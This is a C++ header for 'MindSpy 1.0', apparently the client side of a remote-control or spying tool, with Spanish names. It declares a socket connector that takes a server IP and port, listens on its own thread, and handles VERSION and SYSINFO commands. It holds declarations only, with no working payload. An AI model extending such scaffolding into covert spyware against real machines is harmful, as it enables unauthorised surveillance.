#pragma once
#include <windows.h>
#include <string>
#include <sstream>
#include <cstdio>
#include <Iphlpapi.h>
#include "Sistema.h"
#define MAX_BUFFER 4096
#define CANTIDAD_COMANDOS 2
#define COMANDO_NO_EXISTENTE -1
#define VERSION_CLIENTE "MindSpy 1.0 - (Alpha, Pre-Release)"

using namespace std;

namespace MindSpy
{
	class Conector {
	private:
		enum CLNT_CMDS {
			VERSION,
			SYSINFO
		};
		WSADATA wsd;
		SOCKET sckt;
		sockaddr_in server;
		bool Conectado;
		char msg[MAX_BUFFER];
		
		void Escuchar();
		static DWORD WINAPI HiloProc(LPARAM l)
		{
			Conector *c = (Conector*)l;
			c->Escuchar();
			return TRUE;
		}

		int TipoComando(const char*c);
		

	public:
		Conector(string IP, UINT32 Puerto);
		~Conector();
		bool Listo();
		bool EnviarComando(char* cmd);
	};
}
